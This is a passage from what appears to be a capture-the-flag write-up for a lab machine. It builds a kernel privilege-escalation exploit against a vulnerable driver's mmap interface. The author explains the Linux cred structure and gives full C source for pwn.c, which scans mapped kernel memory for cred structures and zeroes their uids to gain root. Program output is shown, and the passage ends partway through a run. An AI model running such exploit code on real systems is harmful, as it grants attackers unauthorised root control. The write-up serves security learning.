class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we're permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="keyword">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We’ll notice that the first 8 integers (representing our <code>uid</code>, <code>gid</code>, saved <code>uid</code>, saved <code>gid</code>, effective <code>uid</code>, effective <code>gid</code>, <code>uid</code> and <code>gid</code> for the virtual file system) are known to us, which represents a reliable pattern to search for in the memory:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br></pre></td></tr></table></figure><p>These 8 integers are followed by a variable called <code>securebits</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br></pre></td></tr></table></figure><p>Then that variable is followed by our capabilities:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br></pre></td></tr></table></figure><p>Since we know the first 8 integers we can search through the memory for that pattern, when we find a valid <code>cred</code> structure pattern we’ll overwrite each integer of the 8 with a <code>0</code> and check if our <code>uid</code> changed to <code>0</code>, we’ll keep doing it until we overwrite the one which belongs to our process, then we’ll overwrite the capabilities with <code>0xffffffffffffffff</code> and execute <code>/bin/sh</code>. Let’s try to implement the search for <code>cred</code> structures first.<br>To do that we will get our <code>uid</code> with <code>getuid()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> uid = getuid();</span><br></pre></td></tr></table></figure><p>Then search for 8 consecutive integers that are equal to our <code>uid</code>, when we find a <code>cred</code> structure we’ll print its pointer and keep searching:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr) &lt; (mmapStart + <span class="built_in">size</span> - <span class="number">0x40</span>))&#123;</span><br><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid</span><br><span class="line">)&#123;</span><br><span class="line">credNum++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Cred structure found! ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addr++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pwn.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;                                                                          </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;                                                        </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;                                                       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * <span class="keyword">const</span> * argv)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] PID: %d\n"</span>, getpid());</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/dhid"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Open failed!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Open OK fd: %d\n"</span>, fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = <span class="number">0xf0000000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mmapStart = <span class="number">0x42424000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> * addr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)mmap((<span class="keyword">void</span>*)mmapStart, <span class="built_in">size</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (addr == MAP_FAILED)&#123;</span><br><span class="line">perror(<span class="string">"[!] Failed to mmap"</span>);</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] mmap OK address: %lx\n"</span>, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> uid = getuid();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Current UID: %d\n"</span>, uid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> credIt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> credNum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr) &lt; (mmapStart + <span class="built_in">size</span> - <span class="number">0x40</span>))&#123;</span><br><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid</span><br><span class="line">)&#123;</span><br><span class="line">credNum++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Cred structure found! ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addr++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">stop</span> = getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It worked:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ .&#x2F;pwn </span><br><span class="line">[+] PID: 1215</span><br><span class="line">[*] Open OK fd: 3</span><br><span class="line">[*] mmap OK address: 42424000</span><br><span class="line">[*] Current UID: 1000</span><br><span class="line">[*] Cred structure found! ptr: 0x76186484, crednum: 1</span><br><span class="line">[*] Cred structure found! ptr: 0x76186904, crednum: 2</span><br><span class="line">[*] Cred structure found! ptr: 0x76186b44, crednum: 3</span><br><span class="line">[*] Cred structure found! ptr: 0x76186cc4, crednum: 4</span><br><span class="line">[*] Cred structure found! ptr: 0x76186d84, crednum: 5</span><br><span class="line">[*] Cred structure found! ptr: 0x76186fc4, crednum: 6</span><br><span class="line">[*] Cred structure found! ptr: 0x761872c4, crednum: 7</span><br><span class="line">[*] Cred structure found! ptr: 0x76187684, crednum: 8</span><br><span class="line">[*] Cred structure found! ptr: 0x76187984, crednum: 9</span><br><span class="line">[*] Cred structure found! ptr: 0x76187b04, crednum: 10</span><br><span class="line">[*] Cred structure found! ptr: 0x76187bc4, crednum: 11</span><br><span class="line">[*] Cred structure found! ptr: 0x76187c84, crednum: 12</span><br><span class="line">[*] Cred structure found! ptr: 0x77112184, crednum: 13</span><br><span class="line">[*] Cred structure found! ptr: 0x771123c4, crednum: 14</span><br><span class="line">[*] Cred structure found! ptr: 0x77112484, crednum: 15</span><br><span class="line">[*] Cred structure found! ptr: 0x771129c4, crednum: 16</span><br><span class="line">[*] Cred structure found! ptr: 0x77113084, crednum: 17</span><br><span class="line">[*] Cred structure found! ptr: 0x77113144, crednum: 18</span><br><span class="line">[*] Cred structure found! ptr: 0x77113504, crednum: 19</span><br><span class="line">[*] Cred structure found! ptr: 0x77113c84, crednum: 20</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a604, crednum: 21</span><br><span class="line">[*] Cred structure found! ptr: 0x7714aa84, crednum: 22</span><br><span class="line">[*] Cred structure found! ptr: 0x7714ac04, crednum: 23</span><br><span class="line">[*] Cred structure found! ptr: 0x7714afc4, crednum: 24</span><br><span class="line">[*] Cred structure found! ptr: 0x7714ba44, crednum: 25</span><br><span class="line">[*] Cred structure found! ptr: 0xb9327bc4, crednum: 26</span><br><span class="line"></span><br><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure><p>Now we need to overwrite the <code>cred</code> structure that belongs to our process, we’ll keep overwriting every <code>cred</code> structure we find and check our <code>uid</code>, when we overwrite the one that belongs to our process our <code>uid</code> should be <code>0</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Process cred structure found ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pwn.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;                                                                          </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;                                                        </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;                                                       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * <span class="keyword">const</span> * argv)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] PID: %d\n"</span>, getpid());</span><br><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/dhid"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Open failed!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Open OK fd: %d\n"</span>, fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = <span class="number">0xf0000000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mmapStart = <span class="number">0x42424000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> * addr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)mmap((<span class="keyword">void</span>*)mmapStart, <span class="built_in">size</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (addr == MAP_FAILED)&#123;</span><br><span class="line">perror(<span class="string">"Failed to mmap: "</span>);</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] mmap OK address: %lx\n"</span>, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> uid = getuid();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Current UID: %d\n"</span>, uid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> credIt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> credNum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr) &lt; (mmapStart + <span class="built_in">size</span> - <span class="number">0x40</span>))&#123;</span><br><span class="line"></span><br><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid</span><br><span class="line">)&#123;</span><br><span class="line">credNum++;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Cred structure found! ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line"></span><br><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Process cred structure found ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addr++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">stop</span> = getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ .&#x2F;pwn </span><br><span class="line">[+] PID: 4773</span><br><span class="line">[*] Open OK fd: 3</span><br><span class="line">[*] mmap OK address: 42424000</span><br><span class="line">[*] Current UID: 1000</span><br><span class="line">[*] Cred structure found! ptr: 0x76186484, crednum: 1</span><br><span class="line">[*] Cred structure found! ptr: 0x76186904, crednum: 2</span><br><span class="line">[*] Cred structure found! ptr: 0x76186b44, crednum: 3</span><br><span class="line">[*] Cred structure found! ptr: 0x76186cc4, crednum: 4</span><br><span class="line">[*] Cred structure found! ptr: 0x76186fc4, crednum: 5</span><br><span class="line">[*] Cred structure found! ptr: 